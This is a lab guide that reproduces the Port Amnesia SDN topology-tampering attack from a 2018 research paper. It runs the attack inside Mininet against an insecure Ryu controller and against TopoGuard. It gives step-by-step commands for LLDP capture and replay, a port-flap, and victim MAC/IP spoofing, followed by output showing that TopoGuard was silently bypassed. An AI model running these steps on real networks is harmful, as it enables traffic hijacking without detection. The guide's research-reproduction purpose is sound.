# Port Amnesia Attack Test (Manual First)

This guide implements the **Port Amnesia** attack from
*Skowyra et al., "Effective Topology Tampering Attacks and Defenses in
Software-Defined Networks", DSN 2018* (`DSN18.pdf` in this folder), and
runs it against:

1. `insecure_baseline_ryu.py` (expected to be vulnerable, no LLDP auth)
2. `topoguard_ryu.py` (the paper's claim is that vanilla TopoGuard CANNOT
   stop this attack — only the proposed `TopoGuard+` extensions can)

After the manual run you can also execute `pa_auto.py` to automate the same
A/B comparison.

## Why this attack matters

TopoGuard ties the LLDP HMAC TLV to the *claimed* `(dpid, port)` of the link
endpoint. It does NOT bind the HMAC to the receiving port. So a *genuine*
LLDP that was emitted by the controller for `(dpid=2, port=1)` and arrived
at host `h3`'s interface (the link `s2:1 -> h3-eth0`) can be relayed across
a side channel to a second attacker host `h1` and re-injected onto
`h1-eth0`. The controller verifies the HMAC (it is real), so it silently
classifies `s1:1` as a **switch-to-switch** port, fabricating a link
`s1:1 <-> s2:1`. The Port-Down/Port-Up step ("port amnesia") forces
TopoGuard to clear any cached host shutdown state on `s1:1`, ensuring the
relayed LLDP is not pre-rejected and the follow-on victim-MAC takeover is
not flagged as a "Host Move without Port ShutDown" violation.

Topology used (same as `topology.py`):

- `h1`, `h2` on `s1` (`s1:1 = h1`, `s1:2 = h2`)
- `h3` on `s2` (`s2:1 = h3`)
- `h1` is the primary attacker, `h3` is the colluding attacker on the
  far switch, `h2` (`10.0.0.2`, `00:00:00:00:00:02`) is the victim.

The shared host filesystem `/tmp` acts as the side channel that the paper
abstracts as an out-of-band wireless link.

## 1) Manual Test on Insecure Baseline

### Terminal A (controller)

```bash
ryu-manager insecure_baseline_ryu.py
```

### Terminal B (Mininet)

```bash
sudo python3 topology.py
```

Inside the Mininet CLI:

```bash
# Warm up host learning so port profiles converge.
h2 ping -c 2 10.0.0.3
h3 ping -c 2 10.0.0.2

# ARP pinning so post-attack probes are unicast.
h3 arp -s 10.0.0.2 00:00:00:00:00:02

# Pre-attack reachability check.
h3 ping -c 2 10.0.0.2
sh ovs-ofctl -O OpenFlow13 dump-flows s1 | grep "dl_dst=00:00:00:00:00:02"

# --- Port Amnesia ---
# 1) h3 sniffs one controller-emitted LLDP that arrives on h3-eth0.
h3 python3 attacks/port_amnesia.py capture --iface h3-eth0 --out /tmp/pa_lldp.bin --timeout 10

# 2) h1 brings its interface down/up (port amnesia) and replays the LLDP.
h1 python3 attacks/port_amnesia.py inject --iface h1-eth0 --in /tmp/pa_lldp.bin

# 3) Follow-on host-location hijack: h1 spoofs h2.
h1 ip link set dev h1-eth0 down
h1 ip link set dev h1-eth0 address 00:00:00:00:00:02
h1 ip link set dev h1-eth0 up
h1 ip addr add 10.0.0.2/24 dev h1-eth0

# Recompute and check post-attack forwarding.
sh ovs-ofctl -O OpenFlow13 del-flows s1; ovs-ofctl -O OpenFlow13 del-flows s2; ovs-ofctl -O OpenFlow13 add-flow s1 "priority=0,actions=CONTROLLER:65535"; ovs-ofctl -O OpenFlow13 add-flow s2 "priority=0,actions=CONTROLLER:65535"
h1 ping -c 8 -i 0.05 -W 1 10.0.0.3
h3 ping -c 3 10.0.0.2
sh ovs-ofctl -O OpenFlow13 dump-flows s1 | grep "dl_dst=00:00:00:00:00:02"
```

### Expected Output (Baseline)

- `pre`: `dl_dst=00:00:00:00:00:02` flows on `s1` point at the victim port (port 2).
- Controller log shows `[INSECURE] Learned link 2:1 -> 1:1 from LLDP packet-in on local port 1`.
- After the spoof, `s1` flows for the victim MAC may include the attacker port (port 1).
- The baseline emits LLDP only every 600 s, so the capture step often
  needs a second attempt; the automated driver re-tries.

Exit Mininet with `exit`, then `sudo mn -c` and stop the controller.

## 2) Manual Test on TopoGuard

### Terminal A (controller)

```bash
ryu-manager topoguard_ryu.py
```

### Terminal B (Mininet)

```bash
sudo python3 topology.py
```

Inside the Mininet CLI run the **same sequence** as above.

### Expected Output (TopoGuard) — the bypass

- `pre`: `s1` flows for the victim MAC point at port 2 (legitimate).
- TopoGuard log records LLDP being received at `h3` and `h1` but does
  NOT log any `Violation: receive falsified LLDP` or
  `Violation: Receive LLDP packet from HOST port` line for the relayed
  LLDP — the HMAC is genuine, so the verification path silently
  reclassifies `s1:1` as `SWITCH`.
- After the spoof, `_handle_host_traffic` short-circuits on the
  `SWITCH`-classified port and skips the host-move check, so the
  victim MAC is L2-learned at the attacker port without a
  `Violation: Host Move ... without Port ShutDown` line.
- `s1` flows for `dl_dst=00:00:00:00:00:02` now point at port 1
  (attacker), and `h3 -> 10.0.0.2` traffic reaches `h1` instead of `h2`.

This matches the paper's claim that **plain TopoGuard cannot detect
Port Amnesia**: the attack succeeds and there is no controller alert.
Detection requires the `TopoGuard+` Control Message Monitor that
correlates Port-Down/Port-Up events with LLDP propagation (Section VI of
the paper).

## 3) Automatic A/B Test

```bash
sudo python3 pa_auto.py
```

It prints, per controller:

- `pre_loss` / `post_loss` packet-loss percentages from `h3 -> 10.0.0.2`
- `pre_outputs` / `post_outputs` output-port set on `s1` for the victim MAC
- `attacker_port` / `victim_port`
- `insecure_link_learned` (baseline only)
- `falsified_lldp_violation`, `host_port_lldp_violation`, `host_move_violation`
  — all of which should be `False` for TopoGuard if the attack succeeds
- `log` path for the controller log file

`result=PASS` means the Port Amnesia attack succeeded against TopoGuard:
victim MAC forwarding on `s1` was redirected to the attacker port AND
TopoGuard logged no relevant violation, demonstrating that the defense
was bypassed.

## Observed result on this lab

```
baseline:  pre_loss=0 post_loss=100 pre_outputs=[2] post_outputs=[]
           insecure_link_learned=True  falsified_lldp_violation=False
           host_port_lldp_violation=False  host_move_violation=False
topoguard: pre_loss=0 post_loss=0   pre_outputs=[2] post_outputs=[1]
           insecure_link_learned=False falsified_lldp_violation=False
           host_port_lldp_violation=False host_move_violation=False
result=PASS
```

Baseline log (`pa_baseline.log`) contained the legitimate inter-switch
link plus the **fabricated** entry:

```
[INSECURE] Learned link 2:1 -> 1:1 from LLDP packet-in on local port 1
```

TopoGuard log (`pa_topoguard.log`) contained only startup banners and
**zero** `Violation:` lines — confirming a silent bypass: the relayed
LLDP HMAC verified, `s1:1` was reclassified as `SWITCH`, and the
follow-on victim-MAC takeover was absorbed as transit traffic on the
"switch" port. `s1`'s flow table redirected `dl_dst=00:00:00:00:00:02`
from the victim port (`2`) to the attacker port (`1`).
